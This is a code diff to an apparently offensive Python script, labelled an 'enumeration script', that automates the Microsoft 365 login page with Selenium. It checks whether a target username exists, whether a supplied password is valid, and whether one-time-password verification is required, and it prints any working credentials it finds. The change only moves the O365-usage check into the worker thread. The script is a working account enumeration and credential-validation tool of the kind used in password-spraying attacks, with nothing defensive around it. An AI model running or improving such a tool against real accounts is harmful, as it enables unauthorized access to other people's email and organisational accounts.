@@ -84,44 +84,43 @@ class check_o365(Thread):
         self.password = password
 
     def run(self):
-        driver = webdriver.Chrome()
-        driver.get("https://login.microsoftonline.com")
-        element = driver.find_element_by_name("loginfmt")
-        element.send_keys(self.username)
-        element.send_keys(Keys.RETURN)
-        time.sleep(1)
-        try:
-            driver.find_element_by_id("usernameError")
-            print("[!] {0} is not a valid username".format(self.username))
-        except:
-            element = driver.find_element_by_name("passwd")
-            element.send_keys(self.password)
-            time.sleep(1)
+        using_o365(self.username)
+        if not iso365:
+            print("[!]. Target is not using o365. Aborting.")
+        else:
+            driver = webdriver.Chrome()
+            driver.get("https://login.microsoftonline.com")
+            element = driver.find_element_by_name("loginfmt")
+            element.send_keys(self.username)
             element.send_keys(Keys.RETURN)
+            time.sleep(1)
             try:
-                driver.find_element_by_id("passwordError")
-                print("[!] Valid username: {0} with incorrect password".format(
-                    self.username))
+                driver.find_element_by_id("usernameError")
+                print("[!] {0} is not a valid username".format(self.username))
             except:
+                element = driver.find_element_by_name("passwd")
+                element.send_keys(self.password)
+                time.sleep(1)
+                element.send_keys(Keys.RETURN)
                 try:
-                    driver.find_element_by_id("idDiv_SAOTCS_Proofs")
-                    print(
-                        "[*] Valid crentials found but requires OTP. {0}:{1}".format(self.username, self.password))
+                    driver.find_element_by_id("passwordError")
+                    print("[!] Valid username: {0} with incorrect password".format(
+                        self.username))
                 except:
-                    print("[**] Valid credentials found with no OTP required. {0}:{1}".format(
-                        self.username, self.password))
-
-
+                    try:
+                        driver.find_element_by_id("idDiv_SAOTCS_Proofs")
+                        print(
+                            "[*] Valid crentials found but requires OTP. {0}:{1}".format(self.username, self.password))
+                    except:
+                        print("[**] Valid credentials found with no OTP required. {0}:{1}".format(
+                            self.username, self.password))
+    
 def main():
     cls()
     print("Starting enumeration script. Hold tight: {0}".format(
         datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
-    using_o365(args.username)
-    if iso365:
-        userCheck = check_o365(args.username)
-        userCheck.start()
-    else:
-        print("[!] Aborting. Target is not using o365")
+    userCheck = check_o365(args.username)
+    userCheck.start()
 
 
 if __name__ == '__main__':
